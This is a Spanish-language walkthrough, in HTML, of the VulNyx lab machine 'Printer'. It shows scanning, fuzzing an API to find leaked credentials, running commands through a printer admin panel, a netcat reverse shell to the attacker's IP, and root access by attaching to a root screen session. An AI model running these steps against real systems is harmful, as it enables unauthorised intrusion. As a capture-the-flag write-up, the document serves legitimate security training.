@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Printer | noname</title>
+<meta property="og:title" content="VulNyx - Printer | noname" />
+<meta name="twitter:title" content="VulNyx - Printer | noname" />
+<meta itemprop="name" content="VulNyx - Printer | noname" />
+<meta name="application-name" content="VulNyx - Printer | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Printer">
+<meta itemprop="description" content="Writeup Printer" />
+<meta property="og:description" content="Writeup Printer" />
+<meta name="twitter:description" content="Writeup Printer" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/printer/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-05-23T15:23:23&#43;0200 />
+    <meta property="article:published_time" content=2023-05-23T15:23:23&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Printer",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-05-23",
+        "description": "Writeup Printer",
+        "wordCount":  740 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-05-23",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/printer/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Printer</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-05-23T15:23:23&#43;02:00" itemprop="datePublished"> May 23, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/printer/printer_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Leaked Credentials</em></li>
+<li><em>RCE</em></li>
+<li><em>Abuse Screen Binary</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -v -n 192.168.1.120
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">9999/tcp open  abyss
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80,9999 192.168.1.120
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
+</span></span><span class="line"><span class="cl">|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
+</span></span><span class="line"><span class="cl">9999/tcp open  abyss?
+</span></span><span class="line"><span class="cl">| fingerprint-strings: 
+</span></span><span class="line"><span class="cl">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+</span></span><span class="line"><span class="cl">|     Konica Minolta Printer Admin Panel
+</span></span><span class="line"><span class="cl">|     Password:
+</span></span><span class="line"><span class="cl">|   NULL: 
+</span></span><span class="line"><span class="cl">|_    Konica Minolta Printer Admin Panel
+</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port9999-TCP:V=7.93%I=7%D=5/20%Time=64691312%P=x86_64-pc-linux-gnu%r(NU
+</span></span><span class="line"><span class="cl">SF:LL,25,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\n&#34;)%r(GetRequ
+</span></span><span class="line"><span class="cl">SF:est,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x
+</span></span><span class="line"><span class="cl">SF:20&#34;)%r(HTTPOptions,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel
+</span></span><span class="line"><span class="cl">SF:\n\nPassword:\x20&#34;)%r(FourOhFourRequest,2F,&#34;\nKonica\x20Minolta\x20Prin
+</span></span><span class="line"><span class="cl">SF:ter\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(JavaRMI,2F,&#34;\nKonica\x20Mino
+</span></span><span class="line"><span class="cl">SF:lta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(GenericLines,2F,&#34;
+</span></span><span class="line"><span class="cl">SF:\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(R
+</span></span><span class="line"><span class="cl">SF:TSPRequest,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPass
+</span></span><span class="line"><span class="cl">SF:word:\x20&#34;)%r(RPCCheck,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20P
+</span></span><span class="line"><span class="cl">SF:anel\n\nPassword:\x20&#34;)%r(DNSVersionBindReqTCP,2F,&#34;\nKonica\x20Minolta\
+</span></span><span class="line"><span class="cl">SF:x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(DNSStatusRequestTCP,2
+</span></span><span class="line"><span class="cl">SF:F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%
+</span></span><span class="line"><span class="cl">SF:r(Help,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword
+</span></span><span class="line"><span class="cl">SF::\x20&#34;)%r(SSLSessionReq,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20
+</span></span><span class="line"><span class="cl">SF:Panel\n\nPassword:\x20&#34;)%r(TerminalServerCookie,2F,&#34;\nKonica\x20Minolta
+</span></span><span class="line"><span class="cl">SF:\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(TLSSessionReq,2F,&#34;\n
+</span></span><span class="line"><span class="cl">SF:Konica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(Ker
+</span></span><span class="line"><span class="cl">SF:beros,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
+</span></span><span class="line"><span class="cl">SF:\x20&#34;)%r(SMBProgNeg,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
+</span></span><span class="line"><span class="cl">SF:l\n\nPassword:\x20&#34;)%r(X11Probe,2F,&#34;\nKonica\x20Minolta\x20Printer\x20A
+</span></span><span class="line"><span class="cl">SF:dmin\x20Panel\n\nPassword:\x20&#34;)%r(LPDString,2F,&#34;\nKonica\x20Minolta\x2
+</span></span><span class="line"><span class="cl">SF:0Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(LDAPSearchReq,2F,&#34;\nKon
+</span></span><span class="line"><span class="cl">SF:ica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(LDAPBi
+</span></span><span class="line"><span class="cl">SF:ndReq,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
+</span></span><span class="line"><span class="cl">SF:\x20&#34;)%r(SIPOptions,2F,&#34;\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
+</span></span><span class="line"><span class="cl">SF:l\n\nPassword:\x20&#34;)%r(LANDesk-RC,2F,&#34;\nKonica\x20Minolta\x20Printer\x2
+</span></span><span class="line"><span class="cl">SF:0Admin\x20Panel\n\nPassword:\x20&#34;)%r(TerminalServer,2F,&#34;\nKonica\x20Min
+</span></span><span class="line"><span class="cl">SF:olta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;)%r(NCP,2F,&#34;\nKonica
+</span></span><span class="line"><span class="cl">SF:\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20&#34;);
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>En el puerto 80 encuentro un servidor por defecto de apache.</p>
+<p><img src="/../machines/nyx/printer/http.webp" alt="http"></p>
+<p>En el puerto <strong>9999</strong> intento loguerame con algunas contraseñas por defecto.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc 192.168.1.120 9999
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Konica Minolta Printer Admin Panel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password: admin
+</span></span><span class="line"><span class="cl">Invalid password
+</span></span></code></pre></div><p>Realizo fuerza bruta de directorios y encuentro el directorio <strong>api</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c -t 200 --hc=404 --hl=16 -w /usr/share/seclists/Discovery/Web-Content/common.txt &#34;http://192.168.1.120/FUZZ&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.120/FUZZ
+</span></span><span class="line"><span class="cl">Total requests: 4713
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                          
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000658:   301        9 L      28 W       312 Ch      &#34;api&#34; 
+</span></span></code></pre></div><p>Enumero el directorio <strong>api</strong> y encuentro otro directorio con el nombre <strong>printers</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c -t 200 --hc=404 --hl=16 -w /usr/share/seclists/Discovery/Web-Content/common.txt &#34;http://192.168.1.120/api/FUZZ&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.120/api/FUZZ
+</span></span><span class="line"><span class="cl">Total requests: 4713
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000003251:   301        9 L      28 W       321 Ch      &#34;printers&#34;
+</span></span></code></pre></div><p>En printers veo el siguiente mensaje.
+<img src="/../machines/nyx/printer/searchPrinter.webp" alt="searchPrinter"></p>
+<p>Como me indica el mensaje hago una búsqueda de  printer  <code>id + extensión</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c --hl=9 -t 200 -z range,1-2000 &#34;http://192.168.1.120/api/printers/printerFUZZ.json&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.120/api/printers/printerFUZZ.json
+</span></span><span class="line"><span class="cl">Total requests: 2000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                     
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000001:   200        6 L      9 W        82 Ch       &#34;1&#34;                                                                         
+</span></span><span class="line"><span class="cl">000000002:   200        6 L      9 W        80 Ch       &#34;2&#34;                                                                         
+</span></span><span class="line"><span class="cl">000000004:   200        6 L      9 W        78 Ch       &#34;4&#34;                                                                         
+</span></span><span class="line"><span class="cl">000000005:   200        6 L      9 W        77 Ch       &#34;5&#34;                                                                         
+</span></span><span class="line"><span class="cl">000000003:   200        6 L      9 W        79 Ch       &#34;3&#34;                                                                         
+</span></span><span class="line"><span class="cl">000001599:   200        6 L      9 W        97 Ch       &#34;1599&#34;
+</span></span></code></pre></div><p>En <code>printer1599.json</code> encuentro las credenciales para conectarme a la impresora.</p>
+<p><img src="/../machines/nyx/printer/apiok.webp" alt="apiok"></p>
+<p>Me conecto a la impresora.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ telnet 192.168.1.120 9999
+</span></span><span class="line"><span class="cl">Trying 192.168.1.120...
+</span></span><span class="line"><span class="cl">Connected to 192.168.1.120.
+</span></span><span class="line"><span class="cl">Escape character is &#39;^]&#39;.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Konica Minolta Printer Admin Panel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password: $*******************D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Please type &#34;?&#34; for HELP
+</span></span><span class="line"><span class="cl">&gt;  
+</span></span></code></pre></div><p>Una vez dentro escribo <strong>?</strong> para ver la ayuda.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Please type &#34;?&#34; for HELP
+</span></span><span class="line"><span class="cl">&gt; ?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">To Change/Configure Parameters Enter:
+</span></span><span class="line"><span class="cl">Parameter-name: value &lt;Carriage Return&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Parameter-name Type of value
+</span></span><span class="line"><span class="cl">ip: IP-address in dotted notation
+</span></span><span class="line"><span class="cl">subnet-mask: address in dotted notation (enter 0 for default)
+</span></span><span class="line"><span class="cl">default-gw: address in dotted notation (enter 0 for default)
+</span></span><span class="line"><span class="cl">syslog-svr: address in dotted notation (enter 0 for default)
+</span></span><span class="line"><span class="cl">idle-timeout: seconds in integers
+</span></span><span class="line"><span class="cl">set-cmnty-name: alpha-numeric string (32 chars max)
+</span></span><span class="line"><span class="cl">host-name: alpha-numeric string (upper case only, 32 chars max)
+</span></span><span class="line"><span class="cl">dhcp-config: 0 to disable, 1 to enable
+</span></span><span class="line"><span class="cl">allow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)
+</span></span><span class="line"><span class="cl">deleterawport: &lt;TCP port num&gt;
+</span></span><span class="line"><span class="cl">listrawport: (No parameter required)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">exec: execute system commands (exec id)
+</span></span></code></pre></div><p>Con la opción <strong>exec</strong> puedo ejecutar comandos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; exec id
+</span></span><span class="line"><span class="cl">uid=1000(printer) gid=1000(printer) grupos=1000(printer)
+</span></span></code></pre></div><p>Me mando una shell con netcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; exec nc -e /bin/bash 192.168.1.18 4444
+</span></span></code></pre></div><p>Obtengo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.120] 57206
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=1000(printer) gid=1000(printer) grupos=1000(printer)
+</span></span></code></pre></div><p>Hago una búsqueda de archivos con permisos <strong>SUID</strong> y encuentro el binario <strong>screen</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">printer@printer:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/screen
+</span></span></code></pre></div><p>Verifico los procesos filtrando por screen.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">printer@printer:~$ ps aux | grep screen
+</span></span><span class="line"><span class="cl">root         318  0.0  0.0   2484   564 ?        Ss   13:39   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
+</span></span><span class="line"><span class="cl">printer     2947  0.0  0.0   6252   640 pts/1    S+   13:40   0:00 grep screen
+</span></span></code></pre></div><p>Obtengo el root de la siguiente forma.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">printer@printer:~$ screen -x root/
+</span></span><span class="line"><span class="cl">root@printer:~# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
+</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina Printer.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
